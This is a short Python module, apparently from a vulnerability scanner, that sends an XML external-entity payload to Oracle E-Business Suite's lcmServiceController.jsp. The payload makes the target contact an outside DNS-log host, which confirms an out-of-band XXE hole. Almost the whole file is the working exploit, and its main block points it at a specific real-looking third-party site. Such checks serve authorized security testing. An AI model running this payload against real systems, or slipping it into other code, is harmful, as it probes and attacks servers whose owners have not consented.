import requests, re, urllib3, time
import sys, os

from module.dnslog.getDnslogDomain import getDnslogDomain
from module.dnslog.getDnslogResult import getDnslogResult

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def doCheck(url):
    if url[-1] != "/":
        url = url + "/"
    gets = getDnslogDomain()
    domain = gets[0]
    token = gets[1]
    targetUrl = url + "OA_HTML/lcmServiceController.jsp"
    body = '<!DOCTYPE root PUBLIC "-//B/A/EN" "http://' + domain + '">'
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    time.sleep(2)
    if response.status_code == 200 and getDnslogResult(token):
        return targetUrl
    else:
        return False


if __name__ == '__main__':
    print(doCheck("http://gps.oocl.com/"))